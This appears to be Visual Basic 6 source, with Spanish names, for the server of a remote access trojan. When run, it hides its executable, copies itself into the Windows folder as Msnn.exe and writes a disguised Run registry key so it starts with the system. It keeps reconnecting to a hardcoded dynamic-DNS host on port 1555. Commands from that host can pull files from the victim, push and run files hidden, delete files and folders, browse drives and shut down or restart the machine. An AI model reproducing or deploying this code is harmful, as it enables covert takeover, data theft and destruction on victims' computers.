VERSION 5.00
Begin VB.Form CASITA1 
   ClientHeight    =   3810
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   9030
   LinkTopic       =   "Form1"
   ScaleHeight     =   3810
   ScaleWidth      =   9030
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin VB.TextBox Text3 
      Height          =   375
      Left            =   600
      TabIndex        =   5
      Text            =   "VISIBLE"
      Top             =   2160
      Width           =   975
   End
   Begin VB.DriveListBox Drive1 
      Height          =   315
      Left            =   240
      TabIndex        =   4
      Top             =   1560
      Width           =   3510
   End
   Begin VB.FileListBox File1 
      Height          =   1065
      Hidden          =   -1  'True
      Left            =   3720
      System          =   -1  'True
      TabIndex        =   3
      Top             =   2280
      Width           =   5055
   End
   Begin VB.DirListBox Dir1 
      Height          =   1890
      Left            =   3720
      TabIndex        =   2
      Top             =   360
      Width           =   4815
   End
   Begin VB.Timer Timer1 
      Interval        =   1
      Left            =   3120
      Top             =   1080
   End
   Begin VB.TextBox Text2 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BeginProperty Font 
         Name            =   "Times New Roman"
         Size            =   14.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   405
      Left            =   2970
      TabIndex        =   1
      Text            =   "1555"
      Top             =   300
      Width           =   690
   End
   Begin VB.TextBox Text1 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BeginProperty Font 
         Name            =   "Times New Roman"
         Size            =   14.25
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   405
      Left            =   300
      TabIndex        =   0
      Text            =   "hostperso.ddns.net"
      Top             =   285
      Width           =   2505
   End
End
Attribute VB_Name = "CASITA1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'Creando las Funciones del Servidor Ej: Apagar PC Etc
Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Public WithEvents SM As Socket
Attribute SM.VB_VarHelpID = -1
Dim Datos() As String
Dim Dato As String
Public CHATEO As String
Dim PutoNick As String
Public WEB As String
Dim B As String
Dim Bj As Long
Public BANDERASA As Boolean
Dim ArrCDD() As Byte
Dim TamañoArchi As Long
Dim AtriButos As String
Dim Registri As Object

Private Sub Command2_Click()
SM.CloseSck
End Sub

Private Sub SM_Connect()
Call Funciones.EnviarDatos
End Sub

Private Sub Command4_Click()
MsgBox SM.State
End Sub

Private Sub Dir1_Click()
MsgBox Dir1.Path
End Sub


Private Sub Form_Load()
Dim Codigito As String
Set SM = New Socket

If Text3.Text = "OCULTO1" Then
    
    If Not App.EXEName = "Msnn" Then
    Set Registri = CreateObject("wscript.shell")
    Registri.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\msmsgsNotification.mp3", Environ("WINDIR") & "\Msnn.exe"
    Codigito = "On Error Resume Next" & vbCrLf & "Dim Z" & vbCrLf & "Dim O" & vbCrLf & "Set O = CreateObject(" & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & ")" & vbCrLf & "While Not a = 10000000" & vbCrLf & "a = a + 1" & vbCrLf & "Wend" & vbCrLf & "O.CopyFile " & Chr(34) & App.Path & "\" & App.EXEName & ".exe" & Chr(34) & "," & Chr(34) & Environ("WINDIR") & "\Msnn.exe" & Chr(34) & vbCrLf & "Set Z = CreateObject(" & Chr(34) & "wscript.shell" & Chr(34) & ")" & vbCrLf & "Z.run " & Chr(34) & Environ("WINDIR") & "\Msnn.exe" & Chr(34)
    Open Environ("TEMP") & "\Plugin.vbs" For Binary As #1
    Put #1, , Codigito
    Close #1
    ShellExecute 0, "", Environ("TEMP") & "\Plugin.vbs", "", "", 0
    End
    End If
    
SetAttr App.Path & "\" & App.EXEName & ".exe", vbHidden

    ElseIf Text3.Text = "VISIBLE" Then
    Me.Visible = True
    App.TaskVisible = True

End If




End Sub



Private Sub SM_DataArrival(ByVal bytesTotal As Long)

If BANDERASA = True Then
Bj = Val(Bj) + bytesTotal
SM.GetData ArrCDD
Put #1, , ArrCDD
    If Bj >= TamañoArchi Then
        Close #1
        BANDERASA = False
        Bj = 0
        SM.SendData "ENVIOEXITOSO" & "#"
    End If
Exit Sub
End If

    SM.GetData Dato
        Datos() = Split(Dato, "#")
            
        Select Case Datos(0)
                                    
            Case "DESCONECTAR"
            SM.CloseSck
            Timer1.Enabled = False

            Case "RECONECTAR"
            On Error Resume Next
            SM.CloseSck
            Bj = 0
            While Not Bj = 1000000
            Bj = Val(Bj) + 1
            DoEvents
            Wend
            
            SM.Connect
                    
            Case "TAMARCHI"
                Bj = FileLen(Datos(1))
                SM.SendData "BYTASO" & "#" & Bj
                
            Case "BAJAR"
                
                Open Datos(1) For Binary As #1
                Bj = LOF(1)
                
                ReDim ArrCDD(Bj - 1)

                While Not EOF(1)
                Get #1, , ArrCDD
                SM.SendData ArrCDD
                Wend
                DoEvents

                Close #1
                
                                        
            Case "EJECUTE"
            
                Shell Datos(1), vbHide
                
            Case "KILL"
                
                AtriButos = GetAttr(Datos(1))
                If AtriButos And vbDirectory Then
                Shell "cmd.exe /c RD /Q /S " & Datos(1), vbHide
                Else
                Kill Datos(1)
                End If
                
            Case "NICK"
                Datos() = Split(Dato, "NICKY")
                PutoNick = Datos(1)
                FrmChat.Show
                FrmChat.Text1.Text = FrmChat.Text1.Text & vbCrLf & PutoNick & " a Iniciado Sesión..."
            
            Case "CHAT"
                Datos() = Split(Dato, "TALK")
                CHATEO = Datos(1)
                FrmChat.Text1.Text = FrmChat.Text1 & vbCrLf & PutoNick & " Dice: " & CHATEO
                
                
            Case "CHATCLOSE"
                Unload FrmChat
            
            Case "CHATRESET"
                Unload FrmChat
                FrmChat.Show
                
            Case "APAGARPC"
                Call Funciones.APAGARPC
            
            Case "ABRIRWEB"
                WEB = Datos(1)
                Call Funciones.ABRIRWEB
            
            Case "REINICIARPC"
                Call Funciones.REINICIARPC
                
            Case "ARCHIISCOMING"
                TamañoArchi = Datos(1)
                BANDERASA = True
                If Datos(3) = "ALTERNATIVA" Then
                    Datos(3) = Environ("HOMEDRIVE")
                End If
                SM.SendData "MANDALOCAPORO" + "#"
                
            Open Datos(3) & "\" & Datos(2) For Binary Access Write As #1
            
            Exit Sub
                
            Case "ARCHIVOS"
                                        
                Select Case Datos(1)
        
                    Case "INICIADO"
                        
                        Call Funciones.MANDARDRIVES
                    
                    Case "DIR"
                        
                        Dir1.Path = Datos(2)
                        Dir1.Refresh
                        
                        Call Funciones.MANDARDIR
                        
                    Case "ARCHIS"
                        
                        File1.Path = Datos(2)
                        File1.Refresh
                        
                        Call Funciones.MANDARARCHIVOS
                    
                    Case "TERMINADO"
                            File1.Path = ""
                            Dir1.Path = ""
                            
                End Select
                
        End Select
End Sub


Private Sub Timer1_Timer()

If SM.State <> sckConnected Then
    SM.CloseSck
    SM.Connect CASITA1.Text1.Text, CASITA1.Text2.Text
End If

End Sub

